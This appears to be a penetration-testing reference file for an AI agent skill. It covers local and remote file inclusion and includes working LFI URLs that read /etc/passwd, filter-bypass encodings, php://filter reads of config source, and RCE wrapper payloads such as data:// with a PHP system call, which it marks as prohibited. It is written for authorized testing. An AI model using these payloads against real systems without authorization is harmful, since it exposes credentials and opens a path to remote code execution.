# File Inclusion Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify file inclusion vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual RCE exploitation is prohibited
> - LFI/RFI payloads are for understanding attack surface only, **no system control obtained**
> - Validation proves vulnerability existence (read test file), **no command execution**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

File inclusion vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| LFI Existence | ✓ Read test file (`/etc/passwd`, `win.ini`) | - | RCE exploitation |
| RFI Existence | ✓ Include harmless test URL | - | Include malicious code |
| Wrapper Support | ✓ `php://filter` read source (Base64) | - | `php://input` execute code |
| Log Pollution | ❌ Not by default | ✓ Requires explicit authorization | Write malicious content |

---

## Local File Inclusion (LFI) - Safe Validation Payload

### Basic LFI Validation
```bash
# Within security boundary - only read test file to prove existence
http://target.com/index.php?page=../../../etc/passwd
http://target.com/index.php?page=....//....//....//etc/passwd
http://target.com/index.php?page=/etc/passwd

# Windows
http://target.com/index.php?page=../../../windows/win.ini
http://target.com/index.php?page=C:\windows\system32\drivers\etc\hosts
```

### Encoding Bypass (For Proving Filter Bypassable)
```bash
# Null byte bypass (PHP < 5.3.4)
http://target.com/index.php?page=../../../etc/passwd%00

# Double encoding
http://target.com/index.php?page=%252e%252e%252fetc%252fpasswd

# UTF-8 encoding
http://target.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Path Truncation Bypass (PHP < 5.3)
```bash
# Filename truncated after 4096 bytes
http://target.com/index.php?page=../../../etc/passwd............[repeat to 4096]
```

---

## PHP Wrapper - Safe Validation Payload

### php://filter (Read Source, Safe)
```bash
# Base64 encode read PHP source - within security boundary
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://target.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php

# Security boundary: Only read source, no code execution
```

### ⚠️ php://input / data:// / expect:// (Execution Prohibited)
```bash
# These wrappers can cause RCE - actual execution prohibited
# Only for identifying vulnerability existence, no actual request sent

# Prohibited examples (technical principle only):
# php://input + POST <?php system('id'); ?>  -> ❌ Prohibited
# data://text/plain,<?php system('id'); ?>   -> ❌ Prohibited
# expect://id                                -> ❌ Prohibited
```

---

## Remote File Inclusion (RFI) - Safe Validation Payload

### Basic RFI Validation
```bash
# Within security boundary - include harmless test file to prove existence
http://target.com/index.php?page=http://example.com/test.txt
http://target.com/index.php?page=https://raw.githubusercontent.com/test/test.txt

# Security boundary: Test file contains no executable code, only proves RFI capability
```

### Bypass Methods (For Proving Filter Bypassable)
```bash
# Null byte
http://target.com/index.php?page=http://example.com/test.txt%00

# Double encoding
http://target.com/index.php?page=http:%252f%252fexample.com%252ftest.txt
```

---

## LFI to RCE (Technical Principle Identification)

Following attack paths are for **risk identification**, not actual execution:

| Attack Path | Technical Principle | Security Boundary |
|----------|----------|----------|
| Log Poisoning | Include log file execute injected code | ❌ Injection and inclusion prohibited |
| /proc/self/environ | Process environment variable injection | ❌ Injection prohibited |
| Session File | PHP Session inclusion | ❌ Exploitation prohibited |
| php://filter write file | Use filter chain to write | ❌ Write prohibited |
| Temp file race | phpinfo+LFI exploitation | ❌ Exploitation prohibited |

**After identifying these risks, mark risk level in report, no exploitation execution.**

---

## Common Log/Config File Paths (For LFI Probing)

| File | Linux Path | Windows Path |
|------|-----------|-------------|
| passwd | `/etc/passwd` | — |
| hosts | `/etc/hosts` | `C:\windows\system32\drivers\etc\hosts` |
| Apache log | `/var/log/apache2/access.log` | — |
| Nginx log | `/var/log/nginx/access.log` | — |
| SSH log | `/var/log/auth.log` | — |
| MySQL config | `/etc/mysql/my.cnf` | — |

---

## Analysis Process

1. Parameter identification (`page`, `file`, `include`, `path`, `doc`, `template`)
2. Basic LFI test (read test file)
3. Wrapper support detection (`php://filter`)
4. RFI test (include harmless URL)
5. Path restriction analysis
6. **Stop validation, no RCE exploitation**

---

## Output Format

```markdown
## Vulnerability: File Inclusion

### Type
{LFI/RFI}

### Location
{URL} - {parameter name}

### Proof Payload
http://target.com/index.php?page=../../../etc/passwd

### Read Content
{Test file content fragment}

### Wrapper Support
- php://filter: ✅ Supported
- php://input: ⚠️ Possibly supported (validation prohibited)
- data://: ⚠️ Possibly supported (validation prohibited)

### Risk Level
{see severity rules}

### Severity Classification

LFI/RFI impact has two layers:**file-read capability** (including a local file means arbitrary file read)and **RCE capability** (achieving code execution via php://input/log inclusion/protocol wrappers). confirmed file read is High (consistent with path-traversal), RCE requires additional authorized verification. 

| Actual case | Severity | Note |
|---------|------|------|
| Confirmed inclusion of a local file (reads `/etc/passwd`/configuration/source code)| **High** | Arbitrary file read confirmed (same severity model as path-traversal; reading passwd proves capability)|
| after user authorization confirmed RCE (log inclusion/protocol wrapper/RFI executes code)| **High** (maintain)| RCE chain closure, mark "RCE verified" |
| inclusion point exists but file cannot be read (filtering/path restriction/no permission)| Low | capability not confirmed |
| protocol wrapper support is suspected (php://input/data://)but execution not verified | Low (maintain High if file read is already High)| RCE not confirmed, not because of"possible support"additional escalation |

**Boundary coordination**: RCE verification (actual execution of included code) requires user authorization. Within the default scope, use harmless files such as `/etc/passwd` to prove inclusion capability — once file read is confirmed, record High (capability confirmed principle). RCE paths (php://input etc.) are not actively tested by default; only identify suspected support, and do not escalate based on suspected support alone. 
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ php://input/data:///expect:// execution | Only identify risk, no execution |
| ❌ Log poisoning | No code injection into logs |
| ❌ Session file exploitation | No Session exploitation |
| ❌ File write | No filter chain write |
| ❌ RFI include malicious code | Test file contains no executable code |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Command execution prohibited"
- `README.md` -> Prohibited execution checklist